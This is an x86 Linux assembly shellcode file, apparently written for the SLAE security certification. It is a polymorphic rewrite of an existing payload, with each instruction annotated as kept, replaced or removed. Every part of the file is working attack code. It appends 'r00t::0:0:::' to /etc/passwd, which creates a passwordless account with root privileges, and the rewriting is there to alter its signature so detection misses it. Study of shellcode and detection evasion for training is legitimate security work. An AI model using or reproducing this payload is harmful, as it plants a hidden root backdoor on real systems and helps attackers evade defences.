; Filename: adduser_r00t_polymorphic.nasm
; Author:  David Alvarez Robles (km0xu95)
; Website:  https://blog.asturhackers.es
;
; Purpose: This assembly file has been created for completing the requirements of the SecurityTube Linux Assembly Expert (SLAE) certification

global _start

section .text
_start:
; open("//etc/passwd", OWRONLY | O_APPEND)
	xor eax, eax 		; Replaced
	push eax		; Replaced
	add eax, 5		; Replaced
	;push byte +0x5		; Removed
	;pop eax		; Removed
	;xor ecx,ecx		; Removed
	;push ecx		; Removed
	push dword 0x64777373	; Kept
	push dword 0x61702f63	; Replaced
	push dword 0x74652f2f	; Replaced
	mov ebx,esp		; Kept
	mov cx,0x401		; Kept
	int 0x80		; Kept
	xchg ebx,eax		; Replaced

; write(ebx, "r00t::0:0:::", 12)
	xor eax, eax		; Replaced
	push eax		; Replaced
	add eax, 0x4		; Replaced
	;push byte +0x4		; Removed
	;pop eax		; Removed
	;xor edx,edx		; Removed
	;push edx		; Removed
	push dword 0x3a3a3a30	; Kept
	push dword 0x3a303a3a	; Kept
	push dword 0x74303072	; Kept
	mov ecx,esp		; Kept
	;push byte +0xc		; Removed
	;pop edx		; Removed
	mov dl, 0xc		; Replaced
	int 0x80		; Kept

; close(ebx)
	mov al, 0x6		; Replaced
	;push byte +0x6		; Removed
	;pop eax		; Removed
	int 0x80		; Kept

; exit()
	mov al, 0x1		; Replaced
	;push byte +0x1		; Removed
	;pop eax		; Removed
	int 0x80		; Kept

